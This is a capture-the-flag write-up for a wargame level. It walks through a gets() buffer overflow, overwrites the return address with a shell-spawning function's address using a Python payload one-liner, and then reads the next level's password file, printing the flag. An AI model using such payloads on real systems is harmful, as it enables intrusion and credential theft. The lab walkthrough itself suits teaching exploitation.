For the level1 we have a script called level1 made by level2. After analyzing it in ghidra we can see that the main is extremely basic:
```
void main(void)
{
  char local_50 [76];
  
  gets(local_50);
  return;
}
```
We also can see in the man of gets that this is a function that shouldn't be used at all coast because of it's overflow vulnerabily which sounds delightful for us.

We also can see that local_50 is a buffer of 76 character and indeed when executing level1, if we enter 76 or more characters, we get a segfault. (At 76 characters precisely we get an Illegal instruction to be precise).

After some reaserches on Buffer Overflow exploits we get to learn how to use gdb, a debugger program apparently that allows us to have a ton of details on the program.

Some commands for gdb launched with gdb ./level1:
```
r                   => run the program (run works too)
b main              => set a breakpoint when entering main (can also be an hexadecimal address to stop at a specific line)
disas main          => disassemble a specific functions in order to obtains more infos such as addresses
ni                  => next instruction to go 1 by 1, line by line through the code
info registers      => show all values of registers variables
x/100xb $esp        => show the 100 first spaces of the stack (esp)
p main              => get the address of the main function
```

After checking a little more the code on ghidra, we also found a function called run(), that is not used anywhere:
```
void run(void)
{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}
```

This seems very convenient, so we have to call this function somehow.
After some researches we understood that in the stack the code will be executed in some ways that after the buffer, will be the address of the return function. (where the function has to return to come back to main), if we replaced the address of the return function by the address of run() function, then instead of coming back to main, run would be called and the shell would be executed woth level2 rights.
```
(gdb) p run
$2 = {<text variable, no debug info>} 0x8048444 <run>
```

We now have the address of run, so we tried to inject in a file 'A' char 76 times and then the address of run function in hexadecimal so:
```
echo $(python -c "print('\x90'*76+'\x44\x84\x04\x08')") > /tmp/payload
```

The address has to be written upside down in order to be understood as a pointer address.
Executing it in gdb we get this:
```
(gdb) run < /tmp/payload
Starting program: /home/user/level1/level1 < /tmp/payload
Good... Wait what?

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
```

So the line is printed, but no shell opened. We tried different things to end up with:
```
level1@RainFall:~$ cat /tmp/payload -| ./level1
Good... Wait what?
> 
```

The - at the end of the cat is to leave stin open, so the shell can be opened.
```
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
